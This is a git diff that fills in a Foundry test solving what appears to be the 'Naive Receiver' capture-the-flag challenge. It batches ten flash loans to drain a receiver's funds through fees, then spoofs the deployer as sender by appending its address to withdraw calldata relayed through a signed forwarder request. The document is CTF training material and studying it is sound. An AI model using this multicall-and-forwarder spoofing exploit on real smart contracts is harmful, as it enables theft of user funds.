@@ -77,7 +77,58 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        console.log("Pool: ", address(pool));
+        console.log("receiver: ", address(receiver));
+        console.log("Player: ", address(player));
+        console.log("Player pk: ", playerPk);
+
+        /**
+         * Multicall
+         */
+        bytes[] memory multicall_args;
+        multicall_args = new bytes[](11);
+        for (uint256 i = 0; i < 10; i++) {
+            multicall_args[i] = abi.encodeWithSignature(
+                "flashLoan(address,address,uint256,bytes)", address(receiver), address(weth), WETH_IN_POOL, bytes("")
+            );
+        }
+
+        multicall_args[10] = abi.encodePacked(
+            abi.encodeWithSignature("withdraw(uint256,address)", WETH_IN_POOL + WETH_IN_RECEIVER, address(recovery)),
+            bytes32(uint256(uint160(deployer)))
+        );
+        // pool.multicall(multicall_args);
+
+        /**
+         * Forwarder
+         */
+        BasicForwarder.Request memory req = BasicForwarder.Request({
+            from: address(player),
+            target: address(pool),
+            value: uint256(0),
+            gas: uint256(50000000),
+            nonce: forwarder.nonces(player),
+            data: abi.encodeCall(pool.multicall, multicall_args),
+            deadline: 1 days
+        });
+
+        // Step 1: Compute the data hash using the EIP712 domain separator and struct hash
+        bytes32 dataHash = forwarder.getDataHash(req);
+        bytes32 domainSeparator = forwarder.domainSeparator();
+        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, dataHash));
+
+        // Step 2: Sign the digest using the player's private key
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        // Step 3: Verify that the recovered signer is the expected address
+        address signer = ecrecover(digest, v, r, s);
+        console.log("signer: ", signer);
+        assertEq(player, signer);
+
+        // Step 4: Execute the transaction with the forwarder
+        console.logBytes(signature);
+        require(forwarder.execute(req, signature));
     }
 
     /**
